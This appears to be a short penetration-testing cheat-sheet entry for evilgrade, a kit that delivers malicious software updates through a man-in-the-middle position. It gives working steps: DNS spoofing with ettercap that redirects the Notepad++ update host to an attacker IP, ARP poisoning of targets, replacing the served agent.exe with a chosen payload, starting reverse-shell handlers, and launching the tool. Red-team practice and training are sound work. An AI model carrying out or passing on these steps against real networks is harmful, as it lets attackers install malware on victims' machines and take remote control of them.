[evilgrade](https://github.com/infobyte/evilgrade) | Malicious software update MitM exploit kit. Includes support for JRE, WinZip, OpenOffice, iTunes, Notepad++ and more

Evilgrade primarily works because update servers don't use secure connections (source required).

Setup DNS spoofing
Scenario requires ability to spoof a dns response. This can be done MANY ways, but here is an example with ettercap.
# echo "notepad-plus.sourceforge.net A <attacker_ip>" >> /etc/ettercap/etter.dns
# ettercap -TqM arp:remote /<ip>// /<ip>//
Press "P" for plugins
Select "dns_spoof"

Setup Payload binary
EvilGrade uses a local web server and delivers "agent.exe" in /usr/share/isr-evilgrade/agent directory. Replace this with your favorite binary payload. Start any reverse handlers.


Configure EvilGrade
# ./evilgrade
> conf notepadplus
Ensure all options are set correctly (pointing to your binary, etc)
> show options
> start
